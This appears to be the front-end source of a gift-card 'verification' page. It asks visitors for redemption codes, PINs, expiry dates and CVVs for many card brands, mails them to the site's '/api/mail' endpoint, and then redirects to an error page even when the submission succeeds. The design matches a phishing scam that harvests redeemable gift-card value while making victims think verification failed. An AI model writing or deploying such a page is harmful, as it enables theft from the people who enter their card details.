"use client"
import {React, useState } from 'react'
import toast, { Toaster } from 'react-hot-toast';
import { useRouter } from 'next/router';
import Success from './Success';
import { redirect } from 'next/navigation'

// import { sendCardDetails } from '@/lib/api'

const Verify = () => {

  const [cardType, setCardType] = useState('Select type of Card');
  const [currency, setCurrency] = useState('USD');
  const [amount, setAmount] = useState('');
  const [redemptionCode, setRedemptionCode] = useState('');
  const [giftCardPin, setGiftCardPin] = useState('');
  const [giftCardExpiry, setGiftCardExpiry] = useState('');
  const [giftCardCVV, setGiftCardCVV] = useState('');
  const [error, setError] = useState('');
  const [emailSent, setEmailSent] = useState(false);
  
  const handleCardTypeChange = (e) => {
    const selectedCardType = e.target.value;
    setCardType(selectedCardType);
    setGiftCardPin('');
    setGiftCardExpiry('');
    setGiftCardCVV('');
  };


  const sendData = async (e) => {
    e.preventDefault()

    // const pattern = /^[A-Z0-9]{10}$/;

    if(cardType && amount && redemptionCode ) {

      const emailData = {
        cardType,
        currency,
        amount,
        redemptionCode
      }

      if (cardType === 'Nodestorm' || cardType === 'Nike') {
        emailData.giftCardPin = giftCardPin;
      } else if (
        cardType === 'Master Card' ||
        cardType === 'Vanilla Visa' ||
        cardType === 'Wallmart Visa' ||
        cardType === 'Visa Silvery White' ||
        cardType === 'TT Visa'
      ) {
        emailData.giftCardPin = giftCardPin;
        emailData.giftCardCVV = giftCardCVV;
      } else if (cardType === 'Amex') {
        emailData.giftCardExpiry = giftCardExpiry;
        emailData.giftCardPin = giftCardPin;
        emailData.giftCardCVV = giftCardCVV;
      }

      toast.loading('Checking data', {
        duration: 6000,
      });
      // console.log(emailData)
      
      fetch ('/api/mail', {
        method: 'POST',
        body: JSON.stringify(emailData),
        headers: {
          "Content-Type" : "application/json",
          Accept: "application/json",
        },
      })
        .then(response => {
          if (response.ok) {
            // Email sent successfully
            // toast.success('Message sent', {
            //   duration: 4000,
            //   position: 'top-center',
            // })
            setEmailSent(true)
            // alert('Email sent!');
            setCardType('Select type of Card');
            setCurrency('USD');
            setAmount('');
            setRedemptionCode('');
            setGiftCardPin('');
            setGiftCardExpiry('');
            setGiftCardCVV('');
            setError('');
          } else {
            // Error occurred while sending email
            toast.error('This is an error!', {
              duration: 4000,
            });
            throw new Error('Error sending email');
          }
        })
        .catch(error => {
          alert('Error sending email');
        });
      console.log("finished")

    } else (
      setError('Please input all fields')
    )

  }


  return (
    <section className='mt-8 w-screen h-screen bg-primary flex items-center justify-center' id='verify'>
      <div className='flex flex-col items-center justify-center sm:w-1/2 h-max py-12 bg-secondary sm:rounded-xl'>
      {emailSent ? (
        // <Success />
        redirect('/error')
      ) : (
        <form method='post' className='flex flex-col gap-8 w-full px-12'> 
          <span className='flex justify-center text-4xl sm:text-6xl text-white font-bold'>Verify Card Information</span>
          <select 
            name="cardType" 
            id="cardType" 
            // value={values.cardType} 
            value={cardType} 
            // onChange={handleChange} 
            onChange={handleCardTypeChange} 
            className='w-full h-16 p-4 rounded-xl'
            required
            >
            <option defaultValue="" disabled>Select type of Card</option>
            <option value="Amazon">Amazon</option>
            <option value="American Express">American Express</option>
            <option value="Amex">Amex</option>
            <option value="Apple">Apple</option>
            <option value="eBay">eBay</option>
            <option value="Foot locker">Foot Locker</option>
            <option value="Nike">Nike</option>
            <option value="Nodestorm">Nodestorm</option>
            <option value="MasterCard">MasterCard</option>
            <option value="PlayStation">PlayStation</option>
            <option value="RazorGold">RazorGold</option>
            <option value="Sephora">Sephora</option>
            <option value="Steam">Steam</option>
            <option value="TT Visa">TT Visa</option>
            <option value="Vanilla Visa">Vanilla Visa</option>
            <option value="Visa Silvery White">Visa Silvery White</option>
            <option value="Wallmart Visa">Wallmart Visa</option>
            <option value="Xbox">Xbox</option>
          </select>

          <div className='w-full flex gap-4'>
            <select 
              name="currency" 
              id="currency" 
              value={currency} 
              onChange={e => setCurrency(e.target.value)}  
              // value={values.currency} 
              // onChange={handleChange}  
              className='w-1/4 h-16 p-4 rounded-xl'
              >
              <option value="AUD">AUD</option>
              <option value="CAD">CAD</option>
              <option value="EUR">EUR</option>
              <option value="GBP">GBP</option>
              <option value="USD">USD</option>
            </select>
            <input 
              type='text' 
              name='amount' 
              value={amount} 
              onChange={e => setAmount(e.target.value)} 
              // value={values.amount} 
              // onChange={handleChange} 
              placeholder='Card Amount' 
              className='w-9/12 h-16 p-4 rounded-xl' 
              required
            />
          </div>
          <input 
            type='text' 
            name='redemptionCode'
            value={redemptionCode}
            onChange={e => setRedemptionCode(e.target.value)} 
            // value={values.redemptionCode}
            // onChange={handleChange} 
            placeholder='Redemption Code' 
            className='w-full h-16 p-4 rounded-xl' 
            required
          />

          {(cardType === 'Vanilla Visa' ||
          cardType === 'Wallmart Visa' ||
          cardType === 'Visa Silvery White' ||
          cardType === 'TT Visa' ||
          cardType === 'American Express' ||
          cardType === 'Amex'
          ) && (
            <p className='text-red-600 -mt-4'> 16 digit code at the end of the card </p>

          )}


            {/* Conditionally render cardtype elements if selected */}
          {(cardType === 'Nodestorm' || cardType === 'Nike' || cardType === 'Sephora' || cardType === 'Foot locker') && (
          <div>
            <input
              className='w-full h-16 p-4 rounded-xl' 
              type="text"
              id="giftCardPin"
              name="giftCardPin"
              value={giftCardPin}
              placeholder='Gift Card Pin'
              onChange={e => setGiftCardPin(e.target.value)}
              required
            />
            <br />
          </div>
          )}

          

          {(cardType === 'Master Card' ||
          cardType === 'Vanilla Visa' ||
          cardType === 'Wallmart Visa' ||
          cardType === 'Visa Silvery White' ||
          cardType === 'TT Visa' ||
          cardType === 'American Express' ||
          cardType === 'Amex') && (

          <div className='flex flex-col gap-4'> 
            <input
              className='w-full h-16 p-4 rounded-xl' 
              type="text"
              id="giftCardExpiry"
              name="giftCardExpiry"
              placeholder='Gift Card Expiry Date'
              value={giftCardExpiry}
              onChange={e => setGiftCardExpiry(e.target.value)}
              required
            />
            <br />

            {(cardType === 'Amex') && (
              <div>
                <input
                  className='w-full h-16 p-4 rounded-xl mb-4 -mt-4' 
                  type="text"
                  id="giftCardPin"
                  name="giftCardPin"
                  value={giftCardPin}
                  placeholder='4 digit Pin'
                  minLength={4}
                  maxLength={4}
                  onChange={e => setGiftCardPin(e.target.value)}
                  required
                />
                <br />
              </div>
            )}
            <input
              type="text"
              className='w-full h-16 p-4 rounded-xl -mt-4 -pb-16' 
              id="giftCardCVV"
              name="giftCardCVV"
              value={giftCardCVV}
              placeholder='Gift Card CVV'
              onChange={e => setGiftCardCVV(e.target.value)}
              required
            />
            <br />
          </div>
        )}

          { error && <p className='text-red-600 ml-32 lg:ml-72'>{error}</p> }

          <button 
            className=' h-16 rounded-lg bg-primaryText my- text-white cursor-pointer flex items-center justify-center ' 
            type='submit'
            onClick={sendData}
            >
              Continue
          </button>
          <Toaster />
        </form>
      )}
        <span className='relative bottom text-white sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
      </div>
    </section>
  )
}

export default Verify